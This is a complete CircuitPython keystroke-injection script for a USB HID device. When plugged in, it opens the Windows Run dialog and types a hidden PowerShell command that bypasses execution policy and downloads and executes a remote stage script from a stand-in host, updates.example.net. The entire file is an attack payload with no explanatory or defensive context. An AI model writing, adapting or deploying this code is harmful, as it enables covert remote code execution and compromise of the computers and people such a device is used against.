import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
time.sleep(2)
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(0.5)
layout.write("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://updates.example.net/stage.ps1')\"\n")
